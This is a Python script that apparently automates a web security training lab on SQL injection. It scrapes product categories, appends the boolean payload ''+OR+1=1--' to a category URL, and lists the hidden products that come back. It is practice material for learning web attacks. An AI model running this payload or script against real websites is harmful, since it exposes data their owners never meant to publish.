from halo import Halo
import time

from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class HiddenDataSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)
        self.categories = []
        self.categories_url = []
        self.products_name = []
        self.products_price = []
        self.products_url = []
        self.payload_url = None

    def solve(self):
        """Solve the lab."""
        spinner = Halo(text='Starting attack on Hidden Data', spinner='dots')
        spinner.start()
        spinner.text = 'Requesting the lab'
        self._request_lab('GET')
        spinner.text = 'Parsing Categories'
        spinner.text = 'Parsing Products'
        spinner.text = 'Building the payload'
        self.set_category()
        spinner.stop()
        self.print_categories()
        self.set_products()
        self.print_products()
        self.build_payload()
        self._print_payload(self.payload)
        self.payload_url = r"[red]"+self.url+self.categories_url[1]+self.payload+r"[/red]"
        self.console.log(fr"[bold blue]Payload URL:[/bold blue] {self.payload_url}")
        spinner.start()
        spinner.text = 'Requesting the lab with the payload'
        self._request_lab('GET')
        spinner.stop()
        self.console.log(fr"[bold blue]Result:[/bold blue]")
        self.set_products()
        self.print_products()
        self._print_solved()

        
    def set_category(self):
        """Parse the category."""
        categories = self.soup_html.find_all('a', class_='filter-category')
        for category in categories:
            if category.text == "All":
                continue
            self.categories.append(category.text)
            self.categories_url.append(category['href'])

    def print_categories(self):
        """Print the categories."""
        self._print_table("\nCategories Product", ["Category", "URL"],
                          zip(self.categories, self.categories_url))
        
    def set_products(self):
        """Parse the products."""
        section = self.soup_html.find('section', class_='container-list-tiles')
        products = section.find_all('div')
        for product in products:
            self.products_name.append(product.find('h3').get_text())
            self.products_price.append(product.find_all('img')[-1].next_sibling.strip())
            self.products_url.append(product.find('a', class_='button')['href'])
        
    def print_products(self):
        """Print the products."""
        self._print_table(f"\nProducts of {self.categories[1]}", ["Name", "Price", "URL"],
                          zip(self.products_name, self.products_price, self.products_url))

    def build_payload(self):
        """Build the payload."""
        self.payload = "'+OR+1=1--"
